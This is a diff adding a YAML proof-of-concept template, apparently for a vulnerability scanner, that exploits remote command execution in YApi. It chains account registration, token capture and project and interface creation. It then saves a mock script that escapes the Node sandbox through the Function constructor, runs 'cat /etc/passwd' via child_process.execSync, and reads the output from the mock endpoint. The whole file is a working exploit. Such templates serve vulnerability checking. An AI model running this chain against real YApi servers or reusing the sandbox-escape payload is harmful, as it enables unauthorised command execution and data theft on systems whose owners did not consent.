@@ -1,0 +1,90 @@
+id: poc-yaml-yapi-rce
+info:
+  name: YAPI-远程命令执行
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: YAPI
+fofa: app="YApi"
+variables:
+  Email: random_str(8)
+  Username: random_str(8)
+  Password: random_str(8)
+  Path: random_str(8)
+  projectName: random_str(8)
+requests:
+- method: POST
+  path: /api/user/reg
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"email":"{{.Email}}@qq.com","password":"{{.Password}}","username":"{{.Username}}"}
+
+    '
+  expression: status_code == 200 && contains(body, Email) && contains(body, Username)
+  output:
+  - regex_match(headers, "_yapi_token=(?P<token>.+);")
+  - regex_match(headers, "_yapi_uid=(?P<uid>.+);")
+- method: GET
+  path: /api/group/list
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+  expression: status_code == 200 && contains(body, "成功") && contains(body, "custom_field1")
+    && contains(body, "个人空间")
+  output:
+  - regex_match(body, "\"_id\":(?P<group_id>\\d+),")
+- method: POST
+  path: /api/project/add/
+  headers:
+    Content-Type: application/json;charset=UTF-8
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+  data: '{"name":"{{.projectName}}","basepath":"","group_id":"{{.group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+
+    '
+  expression: status_code == 200 && contains(body, "group_id") && contains(body, "up_time")
+  output:
+  - regex_match(body, "\"_id\":(?P<project_id>\\d+),")
+- method: GET
+  path: /api/project/get?id={{.project_id}}
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+  expression: status_code == 200 && contains(body, projectName)
+- method: POST
+  path: /api/interface/add
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+    Content-Type: application/json;charset=UTF-8
+  data: '{"method":"GET","catid":"{{.project_id}}","title":"{{.Path}}","path":"/{{.Path}}","project_id":{{.project_id}}}
+
+    '
+  expression: status_code == 200 && contains(body, project_id) && contains(body, Path)
+  output:
+  - regex_match(body, "\"_id\":(?P<interface_id>.+),")
+- method: POST
+  path: /api/plugin/advmock/save
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+    Content-Type: application/json;charset=UTF-8
+  data: '{"project_id":"{{.project_id}}","interface_id":"{{.interface_id}}","mock_script":"const
+    sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor
+    = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(''return
+    process'')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat
+    /etc/passwd\").toString()","enable":true}
+
+    '
+  expression: status_code == 200
+- method: GET
+  path: /mock/{{.project_id}}/{{.Path}}
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+- method: POST
+  path: /api/project/del
+  headers:
+    Cookie: _yapi_token={{.token}};_yapi_uid={{.uid}}
+    Content-Type: application/json;charset=UTF-8
+  data: "{\"id\":\"{{.project_id}}\"} \n"
+  expression: status_code == 200 && contains(body, "\"errmsg\":\"成功！\"") && !contains(body,
+    "<")
+transport: http
